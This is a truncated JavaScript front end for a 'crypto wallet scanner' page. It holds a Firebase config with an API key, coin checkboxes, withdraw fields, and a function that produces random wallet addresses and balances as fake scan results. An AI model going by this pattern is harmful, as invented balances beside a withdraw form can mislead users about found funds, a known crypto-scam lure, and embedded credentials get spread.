// Firebase config (kendi bilgilerini buraya ekle)
const firebaseConfig = {
  apiKey: "AIzaSyBXddctTbfBzgJ9sgtVCvSMtNJRd3JVeHs",
  authDomain: "crypto-eccb4.firebaseapp.com",
  projectId: "crypto-eccb4",
  storageBucket: "crypto-eccb4.appspot.com",
  messagingSenderId: "773649197313",
  appId: "1:773649197313:web:18da6ed3ee63353c4e9300",
  measurementId: "G-B8D9V0V9XE"
};

firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();

// Coin listesi
const coins = [
  "TRX", "USDT", "BTC", "BNB",
  "ETH", "ADA", "SOL", "DOT",
  "DOGE", "XRP", "LTC", "AVAX"
];

const coinContainer = document.getElementById('coinContainer');
const startScanBtn = document.getElementById('startScan');
const stopScanBtn = document.getElementById('stopScan');
const scanOutput = document.getElementById('scanOutput');
const speedSelect = document.getElementById('speedSelect');
const withdrawBtn = document.getElementById('withdrawBtn');
const withdrawAddress = document.getElementById('withdrawAddress');
const withdrawAmount = document.getElementById('withdrawAmount');
const withdrawMessage = document.getElementById('withdrawMessage');
const balanceSpan = document.getElementById('balance');

let scanInterval = null;
let balance = 0; // Bakiyeyi başlangıçta 0 yap

// Coin seçim checkboxlarını oluştur
coins.forEach((coin, idx) => {
  const checkbox = document.createElement('input');
  checkbox.type = 'checkbox';
  checkbox.id = `coin_${idx}`;
  checkbox.value = coin;

  const label = document.createElement('label');
  label.htmlFor = checkbox.id;
  label.textContent = coin;

  coinContainer.appendChild(checkbox);
  coinContainer.appendChild(label);
});

// Adresi yarı gizle
function maskAddress(addr) {
  if(addr.length <= 10) return addr;
  return addr.slice(0, 4) + "..." + addr.slice(-4);
}

// Tarama sırasında cüzdan adreslerini ve bakiye gösteren örnek veri üret (simülasyon)
function generateFakeScanData(selectedCoins) {
  const addresses = [];
  const count = Math.floor(Math.random() * 3) + 2; // 2-4 adres arası

  for(let i=0; i<count; i++){
    // random coin seç
    const coin = selectedCoins[Math.floor(Math.random() * selectedCoins.length)];

    // random adres simülasyonu
    const addr = coin + "T" + Math.random().toString(36).substring(2, 12).toUpperCase();

    // random bakiye (0.1 ile